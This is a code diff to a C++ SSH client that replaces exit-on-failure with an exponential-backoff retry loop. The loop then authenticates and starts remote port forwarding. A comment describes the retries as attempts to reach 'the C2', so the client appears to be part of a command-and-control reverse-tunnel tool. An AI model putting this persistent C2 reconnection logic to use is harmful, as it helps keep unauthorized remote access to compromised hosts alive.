@@ -5,6 +5,7 @@
 
 #include <stdio.h>
 #include <thread>
+#include <math.h> 
 
 #include "client.h"
 #include "global.h"
@@ -299,6 +300,10 @@ int SSHClient::run(const char* username, const char* host, int port)
     int rc;
     int ret = 0;
    
+    // We use this variable to count how many tries have we try to contact the C2 and do an exponential wait
+    // Using the formula (the result is miliseconds): 5 ** (retries/2)
+    // Waits (seconds): 2, 5, 11, 25, 55, 125, 279, 625
+    int retries = 0;
 
     do 
     {
@@ -316,23 +321,26 @@ int SSHClient::run(const char* username, const char* host, int port)
             debug("Error connecting to %s: %s\n",
                 host,
                 ssh_get_error(my_ssh_session));
-            exit(1);
-        }
+            retries++;
 
+            std::this_thread::sleep_for(std::chrono::milliseconds(int(1000 * pow(5, retries/2.0))));
+        }
+        else {
+            retries = 0;
 #ifdef PASSWORD_AUTH
-        rc = ssh_userauth_password(my_ssh_session, username, password);
+            rc = ssh_userauth_password(my_ssh_session, username, password);
 #else
-        rc = ssh_userauth_none(my_ssh_session, username);
+            rc = ssh_userauth_none(my_ssh_session, username);
 #endif
-        if (rc != SSH_AUTH_SUCCESS){
-            debug("Error authenticating with password: %s\n",
-                ssh_get_error(my_ssh_session));
-            exit(1);
+            if (rc != SSH_AUTH_SUCCESS){
+                debug("Error authenticating with password: %s\n",
+                    ssh_get_error(my_ssh_session));
+                exit(1);
+            }
+
+            // do something
+            do_remote_forwarding(my_ssh_session, port, &SSHClient::mutex);
         }
-
-
-        // do something
-        do_remote_forwarding(my_ssh_session, port, &SSHClient::mutex);
     } while(!should_terminate); // When the clients disconnects we try to reconnect it again
 
     pthread_mutex_destroy(&mutex);
